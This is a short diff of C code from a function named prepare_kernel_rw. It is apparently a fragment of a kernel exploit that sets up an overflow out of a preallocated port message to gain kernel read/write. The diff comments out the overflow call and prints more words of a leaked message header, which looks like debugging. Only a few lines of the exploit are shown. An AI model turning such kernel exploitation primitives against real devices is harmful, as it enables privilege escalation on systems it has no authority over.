@@ -528,7 +528,7 @@ uint64_t prepare_kernel_rw() {
   
   // reallocate the holder and overflow out of it
   uint64_t overflow_bytes[] = {0x1104,0,0,0,0,0,0,0};
-  do_overflow(0x1000, 64, overflow_bytes);
+  //do_overflow(0x1000, 64, overflow_bytes);
   
   // grab the holder again
   holder = prealloc_port(prealloc_size);
@@ -548,7 +548,7 @@ uint64_t prepare_kernel_rw() {
   // receive on the first port, reading the header of the second:
   uint64_t* buf = receive_prealloc_msg(first_port);
   
-  for (int i = 0; i < 8; i++) {
+  for (int i = 0; i < 28; i++) {
     printf("0x%llx\n", buf[i]);
   }
   
